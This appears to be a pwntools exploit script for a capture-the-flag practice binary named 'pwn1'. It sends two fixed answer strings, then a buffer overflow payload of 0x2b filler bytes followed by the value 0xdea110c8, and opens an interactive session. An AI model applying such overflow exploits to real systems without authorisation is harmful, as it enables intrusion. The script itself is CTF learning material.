from pwn import *


pwn = process("./pwn1")

line1 = "Sir Lancelot of Camelot"
pwn.sendline(line1)

line2 = "To seek the Holy Grail."
pwn.sendline(line2)

buffer = b'A'*0x2b
buffer += p32(0xdea110c8)

pwn.sendline(buffer)

pwn.interactive()
